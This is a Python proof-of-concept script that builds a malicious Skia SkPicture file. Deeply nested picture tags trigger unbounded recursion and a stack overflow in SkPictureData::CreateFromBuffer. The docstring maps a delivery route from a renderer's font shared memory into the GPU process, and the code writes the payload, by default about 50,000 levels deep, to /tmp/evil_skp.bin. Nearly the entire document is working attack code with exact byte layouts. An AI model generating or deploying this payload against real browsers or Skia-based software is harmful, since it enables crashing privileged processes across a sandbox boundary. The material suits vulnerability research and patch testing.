#!/usr/bin/env python3
"""
Generate malicious SkPicture payload that triggers unbounded recursion in
SkPictureData::CreateFromBuffer (no recursion limit on the buffer-based path).

The payload is delivered to the GPU process via the glyph-drawable channel:
  renderer font_shm -> ServiceFontManager::Deserialize
                    -> SkStrikeClient::readStrikeData
                    -> SkStrike::mergeFromBuffer
                    -> SkStrike::mergeGlyphAndDrawableFromBuffer
                    -> SkGlyph::addDrawableFromBuffer
                    -> SkPictureBackedGlyphDrawable::MakeFromBuffer
                    -> SkPicture::MakeFromData(bytes, &procs /* only fAllowSkSL=false */)

Once inside MakeFromData (stream-based, recursion limit = 100), we transition
to the buffer-based path via SK_PICT_BUFFER_SIZE_TAG. Inside the buffer,
SK_PICT_PICTURE_TAG calls SkPicturePriv::MakeFromBuffer, which calls
SkPictureData::CreateFromBuffer with NO recursion limit. Each nested picture
can contain another SK_PICT_PICTURE_TAG, recursing without bound.

Stream entry:                    [recursionLimit=100, but only for stream-tag PICTURE_TAG]
  -> SK_PICT_BUFFER_SIZE_TAG
     -> parseBufferTag SK_PICT_PICTURE_TAG
        -> SkPicturePriv::MakeFromBuffer        <--- NO recursion limit
           -> SkPictureData::CreateFromBuffer   <--- NO recursion limit
              -> parseBuffer
                 -> parseBufferTag SK_PICT_PICTURE_TAG
                    -> SkPicturePriv::MakeFromBuffer   (loop)
"""

import struct
import sys

# SkSetFourByteTag(a,b,c,d) = (a<<24)|(b<<16)|(c<<8)|d
def tag(s):
    return (ord(s[0]) << 24) | (ord(s[1]) << 16) | (ord(s[2]) << 8) | ord(s[3])

SK_PICT_FACTORY_TAG     = tag('fact')  # 0x66616374
SK_PICT_BUFFER_SIZE_TAG = tag('aray')  # 0x61726179
SK_PICT_PICTURE_TAG     = tag('pctr')  # 0x70637472
SK_PICT_READER_TAG      = tag('read')  # 0x72656164
SK_PICT_EOF_TAG         = tag('eof ')  # 0x656f6620

MAGIC = b"skiapict"
VERSION = 109  # SkPicturePriv::kCurrent_Version = kWorkingColorSpaceOutput

def u32(v): return struct.pack('<I', v)
def i32(v): return struct.pack('<i', v)
def f32(v): return struct.pack('<f', v)

def build_inner_buffer(depth):
    """
    Build the inner buffer content (parsed by parseBufferTag inside
    SK_PICT_BUFFER_SIZE_TAG handling).

    Format inside the buffer:
      tag (u32) = SK_PICT_PICTURE_TAG
      size (u32) = 1 (one nested picture)
      [ nested picture in buffer format, parsed by SkPicturePriv::MakeFromBuffer:
          BufferIsSKP:
            readByteArray(magic, 8): u32(count=8) + "skiapict" (no padding, 8 % 4 == 0)
            readUInt(version): u32(109)
            readRect: 4 * f32
          ssize: i32(1) (means SkPictureData follows)
          parseBuffer:
            tag (u32) = SK_PICT_PICTURE_TAG
            size (u32) = 1
            [ recurse... ]
      ]

    Each nested level (after the first PICTURE_TAG) is exactly 44 bytes:
      4 (count) + 8 (magic) + 4 (ver) + 16 (rect) + 4 (ssize) + 4 (tag) + 4 (size)
    """
    buf = b""
    # Top-level buffer-tag content: PICTURE_TAG announces 1 nested picture
    buf += u32(SK_PICT_PICTURE_TAG)
    buf += u32(1)  # one picture

    # Now write `depth` nested buffer-format pictures, each containing
    # another PICTURE_TAG that recurses. The innermost level will have
    # PICTURE_TAG count=1 but no more data, which will fail validation —
    # but the stack has already overflowed by then.
    one_level = (
        u32(8)                                          # byteArray count = 8
        + MAGIC                                         # "skiapict"
        + u32(VERSION)                                  # version
        + f32(0) + f32(0) + f32(1) + f32(1)             # SkRect{0,0,1,1}
        + i32(1)                                        # ssize = 1 (PictureData follows)
        + u32(SK_PICT_PICTURE_TAG)                      # nested PICTURE_TAG
        + u32(1)                                        # one nested picture (recurse)
    )
    assert len(one_level) == 44
    buf += one_level * depth
    return buf

def build_outer_picture(inner_buffer):
    """
    Build the outer SkPicture in stream format (parsed by SkPicture::MakeFromData
    -> MakeFromStreamPriv -> SkPictureData::CreateFromStream -> parseStreamTag).

    Stream format:
      magic: "skiapict" (8 raw bytes, no length prefix — SkStream not SkReadBuffer)
      version: u32(109)
      cullRect: 4 * f32 (left, top, right, bottom)
      trailingByte: u8(1) = kPictureData_TrailingStreamByteAfterPictInfo
      [ tags follow ]
        tag: u32 = SK_PICT_FACTORY_TAG
        size: u32 = 0 (ignored — FACTORY_TAG re-reads its own size)
        innerSize: u32 = 0 (zero factories — but allocates fFactoryPlayback)

        tag: u32 = SK_PICT_BUFFER_SIZE_TAG
        size: u32 = len(inner_buffer)
        [ inner_buffer ]

        tag: u32 = SK_PICT_EOF_TAG
    """
    buf = b""
    buf += MAGIC                                  # magic (8 raw bytes)
    buf += u32(VERSION)                           # version
    buf += f32(0) + f32(0) + f32(1) + f32(1)      # cullRect
    buf += bytes([1])                             # kPictureData_TrailingStreamByteAfterPictInfo

    # FACTORY_TAG (allocates fFactoryPlayback, required for BUFFER_SIZE_TAG)
    buf += u32(SK_PICT_FACTORY_TAG)
    buf += u32(0)                                 # outer size (ignored)
    buf += u32(0)                                 # inner size: 0 factories

    # BUFFER_SIZE_TAG containing the recursive payload
    buf += u32(SK_PICT_BUFFER_SIZE_TAG)
    buf += u32(len(inner_buffer))
    buf += inner_buffer

    # EOF (never reached — stack overflows during BUFFER_SIZE_TAG parsing)
    buf += u32(SK_PICT_EOF_TAG)

    return buf

if __name__ == "__main__":
    depth = int(sys.argv[1]) if len(sys.argv) > 1 else 50000
    out_path = sys.argv[2] if len(sys.argv) > 2 else "/tmp/evil_skp.bin"

    inner = build_inner_buffer(depth)
    outer = build_outer_picture(inner)

    with open(out_path, "wb") as f:
        f.write(outer)

    print(f"Wrote {len(outer)} bytes ({depth} nested levels) to {out_path}")
    print(f"  Inner buffer: {len(inner)} bytes")
    print(f"  Per-level overhead: 44 bytes")
